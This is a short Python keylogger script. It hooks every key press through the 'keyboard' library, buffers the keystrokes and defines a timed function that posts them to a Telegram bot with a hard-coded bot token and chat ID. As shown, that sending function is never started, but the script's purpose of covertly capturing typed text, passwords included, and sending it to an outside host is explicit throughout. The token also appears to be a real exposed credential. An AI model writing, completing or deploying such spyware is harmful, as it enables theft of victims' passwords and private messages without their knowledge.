import time
import keyboard
import threading
import requests


Token_api = "6818202233:AAG4GpF8DWZhKFp9kpgFESQq_4En4WJkp5A"
chat_id = "1579016671"

# url = f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={}"

# res = requests.get(url)
# print(res.json())

try:
    data = ""
    def on_key_press(event):
        global data
        try:
            data += event.name
        except:
            pass

    def send_logs():
        global data
        requests.get(f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={data}")
        data = ''
        threading.Timer(5, send_logs).start()

    keyboard.on_press(on_key_press)
    keyboard.wait()

    

except KeyboardInterrupt:
    print('Exiting...')



